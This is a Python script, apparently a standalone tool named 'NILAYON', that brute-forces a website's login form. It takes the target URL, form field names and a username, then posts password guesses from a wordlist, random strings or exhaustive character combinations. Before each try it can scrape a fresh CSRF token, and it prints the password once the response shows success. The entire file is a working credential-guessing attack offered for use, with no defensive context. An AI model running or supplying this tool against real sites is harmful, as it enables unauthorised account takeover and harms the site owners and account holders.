import random
import itertools
import requests
from bs4 import BeautifulSoup
print('NILAYON - Brute force to login page'+'\n\n\n\n')



#*****************************Select CSRF*****************************
csrfmethod= input('Do you have csrf tokens in your content?\n[Y] Yes, [N] No\n-->')
if csrfmethod == 'Y' or csrfmethod == 'y':
    #Enter csrf url
    csrfurl = input('Collect csrf token url?\n-->')
    if csrfurl:
        #Enter csrf field name
        csrfname = input('Enter CSRF field name?\n-->')
        if csrfname:
            isession = requests.Session()
        else:
            print('CSRF field is empty...')
    else:
        print('CSRF url is empty...')
elif csrfmethod == 'N' or csrfmethod == 'n':
    isession = requests
else:
    #First condition error
    print('CSRF method error...')





#*****************************Data*****************************
if csrfmethod == 'Y' or csrfmethod == 'y' or csrfmethod == 'N' or csrfmethod == 'n':
    #Enter website
    website = input('Target website?\n-->')
    if website:
        #Enter username field
        user_input = input('What is the username field?\n-->')
        if user_input:
            #Enter username
            usernames = input('What is the username?\n-->')
            if usernames:
                #Enter password field
                pass_input= input('What is the password field\n-->')
                if pass_input:
                    #Responce type
                    responcetipe= input('Responce find out...\n[T] True, [F] False\n-->')
                    if responcetipe == 'T' or responcetipe == 't' or responcetipe == 'F' or responcetipe == 'f':
                        #Enter responce
                        responce = input('Enter responce?\n-->')
                        if responce:
                            #Random password area
                            if website and user_input and usernames and pass_input and responcetipe and responce:
                                input_success = 'true'
                            else:
                                print('Something missing...')
                        else:
                            print('Error responce is empty...')
                    else:
                        print('Responce type unknown selection...')
                else:
                    print('Password field is empty...')
            else:
                print('Username is empty...')
        else:
            print('Username field is empty...')
    else:
        print('Website is empty...')
else:
    #Second condition error
    print('Something is wrong...')





if input_success == 'true':
    #Storage password method
    semethod= input('Secure function?\n[F] File, [R] Random, [S] Auto Serial\n-->')
    if semethod == 'F' or semethod == 'f':
        #Enter password list file
        filesources= input('What is the password file?\n-->')
        list_secure = open(filesources,'r')
        for secures in list_secure.readlines():
            secures= secures.strip('\n')
            #Paramers data
            data_dist = {user_input:usernames,pass_input:secures}
            if csrfmethod == 'Y' or csrfmethod == 'y':
                #Find CSRF token
                csrftoken = BeautifulSoup(isession.get(csrfurl).content, "html.parser").find("input", type="hidden", attrs={"name": csrfname})["value"]
                #Add CSRF token
                data_dist[csrfname] = csrftoken
            #Request sending before
            send_data = isession.post(website, data=data_dist)
            #Request sended after
            if responcetipe == 'T' or responcetipe == 't':
                if responce in send_data.text:
                    #Success request
                    print('[*] Congratulations is this --  %s ' % secures)
                    exit()
                else:
                    #Failed request
                    print('[*] Matching -- %s' % secures)
            if responcetipe == 'F' or responcetipe == 'f':
                if responce in send_data.text:
                    #Failed request
                    print('[*] Matching -- %s' % secures)
                else:
                    #Success request
                    print('[*] Congratulations is this --  %s ' % secures)
                    exit()
#------------------------------------------------------------------------------------------------
    #Random password method
    if semethod == 'R' or semethod == 'r':
        #Input password caracters
        characters = input('What is useing characters?\n-->')
        if characters:
            #Maximum password length
            max_length = int(input('Maximum length password?\n-->'))
            if max_length:
                #Total password length
                total_pass = int(input('Total password?\n-->'))
                if total_pass:
                    for i in range(total_pass):
                        secures = ''.join((random.choice(characters) for i in range(max_length)))
                        #Paramers data
                        data_dist = {user_input:usernames,pass_input:secures}
                        if csrfmethod == 'Y' or csrfmethod == 'y':
                            #Find CSRF token
                            csrftoken = BeautifulSoup(isession.get(csrfurl).content, "html.parser").find("input", type="hidden", attrs={"name": csrfname})["value"]
                            #Add CSRF token
                            data_dist[csrfname] = csrftoken
                        #Request sending before
                        send_data = isession.post(website, data=data_dist)
                        #Request sended after
                        if responcetipe == 'T' or responcetipe == 't':
                            if responce in send_data.text:
                                #Success request
                                print('[*] Congratulations is this --  %s ' % secures)
                                exit()
                            else:
                                #Failed request
                                print('[*] Matching -- %s' % secures)
                        if responcetipe == 'F' or responcetipe == 'f':
                            if responce in send_data.text:
                                #Failed request
                                print('[*] Matching -- %s' % secures)
                            else:
                                #Success request
                                print('[*] Congratulations is this --  %s ' % secures)
                                exit()
                else:
                    print('Total password is empty...')
            else:
                print('Maximum length is empty...')
        else:
            print('Characters is empty...')
#------------------------------------------------------------------------------------------------
    #Serial password method
    if semethod == 'S' or semethod == 's':
        #Input password caracters
        characters = input('What is useing characters?\n-->')
        if characters:
            #Minimum password length
            min_length = int(input('Minimum length password?\n-->'))
            if min_length:
                #Maximum password length
                max_length = int(input('Maximum length password?\n-->'))
                if max_length:
                    for serial in range(min_length, max_length+1):
                        for random in itertools.product(characters, repeat=serial):
                            secures=''.join(random)
                            #Paramers data
                            data_dist = {user_input:usernames,pass_input:secures}
                            if csrfmethod == 'Y' or csrfmethod == 'y':
                                #Find CSRF token
                                csrftoken = BeautifulSoup(isession.get(csrfurl).content, "html.parser").find("input", type="hidden", attrs={"name": csrfname})["value"]
                                #Add CSRF token
                                data_dist[csrfname] = csrftoken
                            #Request sending before
                            send_data = isession.post(website, data=data_dist)
                            #Request sended after
                            if responcetipe == 'T' or responcetipe == 't':
                                if responce in send_data.text:
                                    #Success request
                                    print('[*] Congratulations is this --  %s ' % secures)
                                    exit()
                                else:
                                    #Failed request
                                    print('[*] Matching -- %s' % secures)
                            if responcetipe == 'F' or responcetipe == 'f':
                                if responce in send_data.text:
                                    #Failed request
                                    print('[*] Matching -- %s' % secures)
                                else:
                                    #Success request
                                    print('[*] Congratulations is this --  %s ' % secures)
                                    exit()
                else:
                    print('Maximum length is empty...')
            else:
                print('Minimum length is empty...')
        else:
            print('Characters is empty...')
    else:
        print('Invalid password method...')
else:
    #Third condition error
    print('Something is wrong...')